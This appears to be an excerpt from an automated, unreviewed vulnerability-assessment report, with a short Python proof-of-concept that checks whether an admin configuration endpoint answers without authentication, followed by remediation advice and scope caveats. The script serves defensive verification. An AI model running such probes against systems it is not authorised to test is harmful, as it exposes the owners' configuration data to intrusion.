scripts.source:
import requests
import sys

target = sys.argv[1]
url = f"{target}/rest/admin/application-configuration"
response = requests.get(url)
if response.status_code == 200 and 'config' in response.text.lower():
    print('W-002 reproduced: Accessible admin configuration endpoint')
else:
    print('W-002 not reproduced')
scripts.description: Attempts to access the admin configuration endpoint without authentication to verify IDOR.
scripts.remediation_pointer: Implement proper access controls and ensure admin endpoints are protected.

caveats: Produced by an autonomous pipeline with no human review. Findings should be validated by a security engineer before remediation is prioritised or the results are shared externally.
Only proven findings are listed. Of 61 candidate weakness(es), 61 were tested for exploitability and 13 were proven; the remainder are hypotheses and are not reported as findings.
The crawl hit a configured limit after 5 pages, so the asset map is a lower bound and parts of the application were never seen.
Absence of a finding is not evidence of absence. This engagement covered what the crawler reached within its configured bounds.
